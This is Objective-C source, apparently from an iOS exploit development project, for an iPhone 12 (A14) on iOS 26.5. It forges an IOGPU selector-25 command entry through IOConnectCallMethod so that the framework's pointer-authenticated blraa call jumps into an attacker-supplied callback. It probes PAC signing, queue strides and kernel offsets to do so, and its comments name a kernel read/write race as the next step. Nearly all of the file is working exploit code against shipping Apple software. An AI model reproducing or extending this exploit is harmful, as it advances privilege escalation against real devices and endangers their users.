//
//  P027MetalCallback.m
//  P007OpenOnly
//
//  Created by Kolby Kehler on 8/27/26.
//


//
//  P027MetalCallback.m
//  P007OpenOnly
//
//  Button 65 — Metal NQ completion: self-signed PAC callback primitive
//
//  Scope:
//    - Forge sel=25 entry with +0x10 = self-signed context (PAC)
//    - Context+0x10 = pacia(callback, ctx+0x10) — self-signed FP
//    - Kernel builds 0x28 NQ packet at 0x95b22b4 when +0x10 != 0
//    - DispatchAvailable dequeues → blraa x11,x9 → calls our callback
//    - Callback runs in IOGPU dispatch thread with x0 = context
//
//  Explicitly NOT:
//    - KRW / reclaim / spray (that's the NEXT step after this primitive proves)
//    - p021 stage-mask (DEAD — autda gate blocks)
//    - Legitimate Metal completedHandler (that was p026's smoke test)
//
//  Cite: Q_NQ_DISPATCH_AVAILABLE.txt, pack 03 submit/serializer, pack 16 sel25 chain
//  ABI: fast path (count=1, stride=0x40), NOT general path (stride=0xC0 needs MD)
//

#import "P027MetalCallback.h"
#import "A14_23F77_LabOffsets.h"
#import "LabLocalTime.h"

#import <Metal/Metal.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach/mach.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <stdio.h>
#import <stdarg.h>
#import <string.h>
#import <unistd.h>

#define P027_BUILD_ID  @"p027-metal-callback-nopacpre"

/* ── Entry layout (fast path, stride=0x40) ── */
#define P027_ENTRY_SIZE  0x40
#define P027_CTX_SIZE    0x1000
#define P027_CTX_FIXED    0x10000000ULL   /* fixed address for PAC modifier */

/* ── IOGPU / IOKit function pointer types ── */
typedef uint32_t (*P027GetConn_t)(void *);
typedef uint32_t (*P027GetQid_t)(void *);
typedef kern_return_t (*P027Iocall_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

/* ── Callback state ── */
static volatile int      p027_fired       = 0;
static volatile uint64_t  p027_captured_x0 = 0;
static volatile int      p027_pac_ok      = 0;   /* pre-check: does blraa accept our pacia? */

/* ── Logging (same pattern as p026) ── */
static FILE *p027_fp = NULL;
static NSMutableString *p027_body = nil;

static void p027_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
static void p027_log(NSString *fmt, ...) {
    if (!p027_fp) {
        NSString *docs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *path = [docs stringByAppendingPathComponent:
                          @"p027_metal_callback_log.txt"];
        p027_fp = fopen(path.UTF8String, "w");
        if (p027_fp) {
            setvbuf(p027_fp, NULL, _IOLBF, 0);
            fprintf(p027_fp, "=== p027 session %s build=%s ===\n",
                    LabLocalMilitaryNow().UTF8String,
                    P027_BUILD_ID.UTF8String);
        }
    }
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p027_fp) {
        fprintf(p027_fp, "%s\n", msg.UTF8String);
        fflush(p027_fp);
    }
    if (p027_body)
        [p027_body appendFormat:@"%@\n", msg];
    NSLog(@"p027 %@", msg);
}

/* ── Metal object unwrapping (from p021) ── */
static id p027_unwrap(id buf)
{
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"])
            break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:s])
            break;
        id b = ((id (*)(id, SEL))objc_msgSend)(buf, s);
        if (!b || b == buf)
            break;
        buf = b;
    }
    return buf;
}

static void *p027_ivar(id obj, const char *name)
{
    if (!obj || !name)
        return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val)
            return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static void *p027_strip(void *p)
{
    return (void *)((uintptr_t)p & 0x0000007FFFFFFFFFULL);
}

static int p027_is_heap(void *p)
{
    uintptr_t x = (uintptr_t)p027_strip(p);
    if (x < 0x100000000ULL)
        return 0;
    if ((x & 7) != 0)
        return 0;
    if ((x >> 28) == 0x16)
        return 0;
    return 1;
}

static void p027_callback(void *ctx);

/*
 * Third-party iOS apps are arm64, not arm64e. In that ABI:
 *   pacia  = NOP (EnIA off) → signed == unsigned
 *   blraa  = UNDEF → SIGILL  (ips 0xd63f117f)
 * IOGPU.framework is arm64e and CAN blraa; we cannot self-test it here.
 * Do not emit PAC insns in this process.
 */
#if defined(__arm64e__)
static uint64_t p027_pacia(uint64_t ptr, uint64_t mod)
{
    register uint64_t x0 __asm__("x0") = ptr;
    register uint64_t x1 __asm__("x1") = mod;
    __asm__ __volatile__(
        ".long 0xDAC10001\n"   /* pacia x0, x1 */
        : "+r"(x0)
        : "r"(x1)
        : "memory"
    );
    return x0;
}

static int p027_pac_precheck(void *ctx, uint64_t ctx_addr)
{
    uint64_t fn_addr  = (uint64_t)&p027_callback;
    uint64_t modifier = ctx_addr + 0x10;
    uint64_t signed_fp = p027_pacia(fn_addr, modifier);
    *(uint64_t *)((uint8_t *)ctx + 0x10) = signed_fp;
    p027_pac_ok = 0;
    register uint64_t x0 __asm__("x0") = ctx_addr;
    register uint64_t x11 __asm__("x11") = signed_fp;
    register uint64_t x9 __asm__("x9") = modifier;
    __asm__ __volatile__(
        ".long 0xD63F117F\n"   /* blraa x11, x9 */
        : "+r"(x0)
        : "r"(x11), "r"(x9)
        : "x1", "x2", "x3", "x4",
          "x12", "x13", "x14", "x15", "x16", "x17", "x18",
          "lr", "memory"
    );
    p027_pac_ok = 1;
    return 1;
}
#endif

/* ── The callback: runs in IOGPU dispatch thread when DispatchAvailable fires ── */
static void p027_callback(void *ctx)
{
    /*
     * x0 = context pointer (the same pointer we put at entry+0x10)
     * x1/x2 = timestamps from NQ packet (we don't care)
     * w3    = flags from NQ packet (we don't care)
     * x4    = extra from NQ packet (we don't care)
     *
     * KEEP THIS MINIMAL. Just prove execution. No complex ops.
     * The dispatch thread may hold IOGPU locks — don't call
     * any IOGPU/Metal functions from here yet.
     */
    p027_fired = 1;
    p027_captured_x0 = (uint64_t)ctx;
}

@implementation P027MetalCallback

+ (NSString *)tap
{
    if (p027_fp) { fclose(p027_fp); p027_fp = NULL; }
    p027_body = [NSMutableString string];
    p027_fired = 0;
    p027_captured_x0 = 0;
    p027_pac_ok = 0;

    p027_log(@"========================================");
    p027_log(@"BUILD %@ (compiled %s %s)", P027_BUILD_ID, __DATE__, __TIME__);
    p027_log(@"target: iPhone13,2 A14 26.5/23F77");
#if defined(__arm64e__)
    p027_log(@"ABI: arm64e — PAC self-sign + blraa precheck ON");
#else
    p027_log(@"ABI: arm64 (third-party) — PAC insns ILLEGAL; skip precheck");
    p027_log(@"pacia is NOP / blraa is SIGILL in this process (ips 0xd63f117f)");
    p027_log(@"IOGPU.framework is arm64e and will blraa; we cannot self-sign");
#endif
    p027_log(@"========================================");

    /* ── Locked RE cites ── */
    p027_log(@"=== CITE: DispatchAvailable (blraa / PAC / x0) ===");
    p027_log(@"sym: _IOGPUNotificationQueueDispatchAvailableCompletionNotifications");
    p027_log(@"dossier unslid: 0x%llx  (IOGPU+0x%llx)",
             (unsigned long long)A14_23F77_NQ_DISPATCH_AVAILABLE,
             (unsigned long long)A14_23F77_NQ_DISPATCH_OFF);
    p027_log(@"packet size: 0x%llx",
             (unsigned long long)A14_23F77_NQ_PACKET_SIZE);
    p027_log(@"indirect call @ +0x%llx:",
             (unsigned long long)A14_23F77_NQ_BLRAA_OFF);
    p027_log(@"  insn:  blraa  x11, x9   (IA key)");
    p027_log(@"  FP:    x11 = *(context + 0x10)");
    p027_log(@"  mod:   x9  = context + 0x10");
    p027_log(@"  x0:    context pointer");
    p027_log(@"=== CITE: sel=25 fast path (count=1, stride=0x40) ===");
    p027_log(@"kernel: DeviceUC sel=%u (0x%x)  handler 0x95ab41c",
             (unsigned)A14_23F77_IOGPU_SUBMIT_SEL,
             (unsigned)A14_23F77_IOGPU_SUBMIT_SEL);
    p027_log(@"entry+0x10 nonzero → kernel packs 0x28 NQ packet at 0x95b22b4");
    p027_log(@"entry+0x18 → vt+0x90 path (try 0 first, dummy fallback)");
    p027_log(@"entry+0x20 → namespace lookup (0 = skip)");

    /* ── Symbol resolve (same as p026) ── */
    p027_log(@"=== RESOLVE ===");
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU",
                         RTLD_LAZY);
    if (!iogpu)
        iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu || !iokit) {
        p027_log(@"[sym] STOP dlopen failed");
        return [self finish:@"dlopen fail"];
    }

    P027GetConn_t devConnFn = (P027GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    P027GetConn_t qConnFn   = (P027GetConn_t)dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    P027GetQid_t  qGetID    = (P027GetQid_t)dlsym(iogpu, "IOGPUCommandQueueGetID");
    P027Iocall_t iocall     = (P027Iocall_t)dlsym(iokit, "IOConnectCallMethod");

    p027_log(@"[sym] DeviceGetConnect=%p QueueGetConnect=%p QueueGetID=%p IOConnectCallMethod=%p",
             devConnFn, qConnFn, qGetID, iocall);
    if (!iocall || !devConnFn || !qConnFn) {
        p027_log(@"[sym] STOP missing required symbols");
        return [self finish:@"missing symbols"];
    }

    /* ── Metal device/queue setup (same as p026/p021) ── */
    p027_log(@"=== SETUP: Metal device + queue ===");
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) {
        p027_log(@"[mtl] STOP no device");
        return [self finish:@"no metal"];
    }
    p027_log(@"[mtl] device=%@", [dev name]);

    id<MTLCommandQueue> cmdQueue = [dev newCommandQueue];
    if (!cmdQueue) {
        p027_log(@"[mtl] STOP no queue");
        return [self finish:@"no queue"];
    }

    /* ── Unwrap Metal objects to get internal refs (from p021) ── */
    id mtlDev = p027_unwrap(dev);
    id mtlQ   = p027_unwrap(cmdQueue);
    void *devRef = p027_strip(p027_ivar(mtlDev, "_deviceRef"));
    void *qRef   = p027_strip(p027_ivar(mtlQ,  "_commandQueue"));

    uint32_t dconn = (devConnFn && p027_is_heap(devRef)) ? devConnFn(devRef) : 0;
    uint32_t qConn  = (qConnFn   && p027_is_heap(qRef))   ? qConnFn(qRef)   : 0;
    uint32_t qid    = (qGetID    && p027_is_heap(qRef))   ? qGetID(qRef)     : 0;

    p027_log(@"[0] dconn=0x%x qConn=0x%x qid=%u", dconn, qConn, qid);
    if (!qConn) {
        p027_log(@"[0] no qConn — falling back to dconn");
        qConn = dconn;
    }
    if (!qConn) {
        p027_log(@"[0] STOP no connect");
        return [self finish:@"no connect"];
    }

    /* ── Read queue stride from internal queue object ──
     * RE: stride must equal *(uint32_t*)(*(queue+0x538)+0x268)
     * Fast path allows stride<=0x40, but we try to match the queue's
     * expected stride first. Fall back to 0x40 if read fails.
     */
    uint32_t stride = P027_ENTRY_SIZE;   /* default: 0x40 (fast path) */
    if (p027_is_heap(qRef)) {
        void *stride_obj = *(void **)((uint8_t *)qRef + 0x538);
        if (p027_is_heap(stride_obj)) {
            uint32_t qstride = *(uint32_t *)((uint8_t *)stride_obj + 0x268);
            if (qstride > 0 && qstride <= P027_ENTRY_SIZE) {
                stride = qstride;
                p027_log(@"[0] queue stride=0x%x (from qRef+0x538→+0x268)", stride);
            } else {
                p027_log(@"[0] queue stride=0x%x out of range, using 0x40", qstride);
            }
        } else {
            p027_log(@"[0] qRef+0x538 not heap, using stride=0x40");
        }
    } else {
        p027_log(@"[0] qRef not heap, using stride=0x40");
    }

    /* ── mmap context page at fixed address ── */
    vm_address_t ctxAddr = P027_CTX_FIXED;
    kern_return_t kr = vm_allocate(mach_task_self(), &ctxAddr,
                                    P027_CTX_SIZE, VM_FLAGS_FIXED);
    if (kr != KERN_SUCCESS || !ctxAddr) {
        p027_log(@"[ctx] vm_allocate fixed=0x%llx failed kr=0x%x, trying anywhere",
                  (unsigned long long)P027_CTX_FIXED, (unsigned)kr);
        ctxAddr = 0;
        kr = vm_allocate(mach_task_self(), &ctxAddr,
                         P027_CTX_SIZE, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS || !ctxAddr) {
            p027_log(@"[ctx] STOP vm_allocate anywhere failed kr=0x%x",
                      (unsigned)kr);
            return [self finish:@"vm_allocate fail"];
        }
        p027_log(@"[ctx] allocated anywhere at 0x%llx (fixed failed)",
                  (unsigned long long)ctxAddr);
    } else {
        p027_log(@"[ctx] allocated fixed at 0x%llx", (unsigned long long)ctxAddr);
    }
    uint8_t *ctx = (uint8_t *)(uintptr_t)ctxAddr;

    /* ── Self-sign our callback FP ──
     * context+0x10 = pacia(&p027_callback, ctx+0x10)
     * The kernel's blraa at DispatchAvailable will:
     *   x9  = ctx + 0x10  (modifier — field address)
     *   x11 = *(ctx + 0x10) (our signed FP)
     *   blraa x11, x9      → authenticate → call p027_callback(ctx)
     */
    uint64_t fn_addr  = (uint64_t)(void *)&p027_callback;
    uint64_t modifier  = (uint64_t)ctx + 0x10;
#if defined(__arm64e__)
    p027_log(@"[ctx] self-signing callback FP (arm64e pacia)");
    uint64_t signed_fp  = p027_pacia(fn_addr, modifier);
    *(uint64_t *)(ctx + 0x10) = signed_fp;
    p027_log(@"[ctx] fn=0x%llx mod=0x%llx signed=0x%llx stored @ ctx+0x10",
             (unsigned long long)fn_addr,
             (unsigned long long)modifier,
             (unsigned long long)signed_fp);
    p027_log(@"[pac] pre-check: userspace blraa");
    if (!p027_pac_precheck(ctx, (uint64_t)ctxAddr)) {
        p027_log(@"[pac] FAILED — pacia signature invalid");
        vm_deallocate(mach_task_self(), ctxAddr, P027_CTX_SIZE);
        return [self finish:@"pac pre-check fail"];
    }
    p027_log(@"[pac] OK — blraa accepted our pacia");
#else
    /* Store unsigned FP. Same as p012. Cannot pacia in arm64 process.
     * IOGPU DispatchAvailable will still blraa — next crash if any is
     * PAC fail INSIDE IOGPU.framework, not SIGILL here. */
    *(uint64_t *)(ctx + 0x10) = fn_addr;
    p027_pac_ok = -1;
    p027_log(@"[ctx] UNSIGNED callback FP (arm64) fn=0x%llx stored @ ctx+0x10",
             (unsigned long long)fn_addr);
    p027_log(@"[ctx] modifier would have been 0x%llx — not signed",
             (unsigned long long)modifier);
    p027_log(@"[pac] SKIP precheck — do not emit pacia/blraa in arm64");
#endif
    if (p027_fp)
        fflush(p027_fp);

    /* ── Build forged entry (fast path, stride=0x40) ──
     * +0x00 = 0          (not loaded by sel25)
     * +0x08 = 0          (not loaded)
     * +0x10 = ctx        (THE GATE — nonzero triggers NQ packet build)
     * +0x18 = 0          (vt path arg — try 0 first)
     * +0x20 = 0          (namespace lookup — 0 = skip)
     * +0x24..+0x3F = 0  (unknown, zeroed)
     */
    struct __attribute__((packed)) P027Entry {
        uint64_t reserved0;   /* +0x00 */
        uint64_t reserved1;   /* +0x08 */
        uint64_t ctx_ptr;     /* +0x10 — THE GATE */
        uint64_t vt_ptr;     /* +0x18 — vt path arg */
        uint32_t namespace;  /* +0x20 — 0 = no lookup */
        uint8_t  pad[0x1C];  /* +0x24..+0x3F */
    } __attribute__((packed));

    struct P027Entry e;
    memset(&e, 0, sizeof(e));
    e.ctx_ptr = (uint64_t)(uintptr_t)ctx;   /* nonzero = trigger */
    e.vt_ptr  = 0;                            /* try 0 first */
    e.namespace = 0;                          /* no namespace lookup */

    p027_log(@"[entry] +0x10=0x%llx (ctx) +0x18=0 (try 0) +0x20=0",
             (unsigned long long)e.ctx_ptr);

    /* ── Submit via sel=25 (fast path) ──
     * scalars: [qid, 0, count=1, stride]
     * 2nd scalar = 0 (UNVERIFIED — p021 used 0, keeping it)
     */
    uint64_t in[4] = { qid, 0, 1, stride };
    uint64_t out = 0;
    uint32_t nout = 1;

    p027_log(@"[submit] sel=%u in=[qid=%u,0,count=1,stride=0x%x]",
             (unsigned)A14_23F77_IOGPU_SUBMIT_SEL, qid, stride);

    kr = iocall(qConn, A14_23F77_IOGPU_SUBMIT_SEL,
                 in, 4, &e, sizeof(e), &out, &nout, NULL, 0);
    p027_log(@"[submit] kr=0x%x out=0x%llx", (unsigned)kr, (unsigned long long)out);

    if (kr != KERN_SUCCESS) {
        p027_log(@"[submit] FAILED kr=0x%x — sel25 rejected entry", (unsigned)kr);

        if (kr == 0xe00002c2) {
            /* Bad argument — likely +0x18=0 was rejected by vt path */
            p027_log(@"[submit] 0xe00002c2 — trying +0x18 = ctx (dummy page)");
            e.vt_ptr = (uint64_t)(uintptr_t)ctx;
            kr = iocall(qConn, A14_23F77_IOGPU_SUBMIT_SEL,
                         in, 4, &e, sizeof(e), &out, &nout, NULL, 0);
            p027_log(@"[submit] retry kr=0x%x (+0x18=ctx)", (unsigned)kr);
        }

        if (kr != KERN_SUCCESS) {
            p027_log(@"[submit] FAILED kr=0x%x — check:", (unsigned)kr);
            p027_log(@"  1. scalar layout: [qid, 0, count=1, stride]");
            p027_log(@"  2. stride must equal queue stride (qRef+0x538→+0x268)");
            p027_log(@"  3. +0x10 must be nonzero (context pointer)");
            p027_log(@"  4. +0x18 may need valid pointer (not 0)");
            p027_log(@"  5. qid must match queue (try qid from QueueGetID)");
            vm_deallocate(mach_task_self(), ctxAddr, P027_CTX_SIZE);
            return [self finish:@"submit fail"];
        }
    }

    /* ── Wait for callback ──
     * The kernel builds the 0x28 NQ packet, queues it.
     * DispatchAvailable dequeues it and does blraa → our callback.
     * Give it a few seconds — the GPU may need to process the
     * (possibly empty) command before signaling completion.
     */
    p027_log(@"[wait] polling for callback (timeout 5s)");
    for (int i = 0; i < 5000 && !p027_fired; i++)
        usleep(1000);

    int did_fire = p027_fired;
    uint64_t got_x0 = p027_captured_x0;

    p027_log(@"[result] fired=%d x0=0x%llx pac_ok=%d",
             did_fire, (unsigned long long)got_x0, p027_pac_ok);

    if (did_fire && got_x0 == (uint64_t)(uintptr_t)ctx) {
        p027_log(@"=== verdict: PRIMITIVE WORKS ===");
        p027_log(@"  PAC self-signing confirmed");
        p027_log(@"  callback ran in IOGPU dispatch thread");
        p027_log(@"  x0 = context (matches our mmap)");
        p027_log(@"next: re-entrancy test (callback re-submits sel=25)");
        p027_log(@"      → race at 0x95b22b4 → KRW bridge");
    } else if (did_fire && got_x0 != (uint64_t)(uintptr_t)ctx) {
        p027_log(@"=== verdict: CALLBACK FIRED but x0 mismatch ===");
        p027_log(@"  expected ctx=0x%llx got x0=0x%llx",
                  (unsigned long long)(uintptr_t)ctx,
                  (unsigned long long)got_x0);
        p027_log(@"  check: entry+0x10 vs what kernel packed into NQ+0x00");
    } else if (!did_fire && kr == KERN_SUCCESS) {
        p027_log(@"=== verdict: SUBMIT OK but no callback ===");
        p027_log(@"  kernel accepted entry but NQ packet not dequeued");
        p027_log(@"  may need a real GPU command to trigger completion");
        p027_log(@"  try: submit a legitimate blit first, then forge");
    } else {
        p027_log(@"=== verdict: SUBMIT FAILED ===");
        p027_log(@"  kr=0x%x — see above for diagnostic", (unsigned)kr);
    }

    p027_log(@"NOT KRW. Primitive proof only.");
    vm_deallocate(mach_task_self(), ctxAddr, P027_CTX_SIZE);
    return [self finish:@"ok"];
}

+ (NSString *)finish:(NSString *)tag
{
    if (p027_fp) {
        fflush(p027_fp);
        fclose(p027_fp);
        p027_fp = NULL;
    }
    NSString *body = p027_body ?: @"(empty)";
    p027_body = nil;
    return [NSString stringWithFormat:
            @"=== LIVE TAP %@ (%@) ===\n%@\n",
            P027_BUILD_ID, tag, body];
}

@end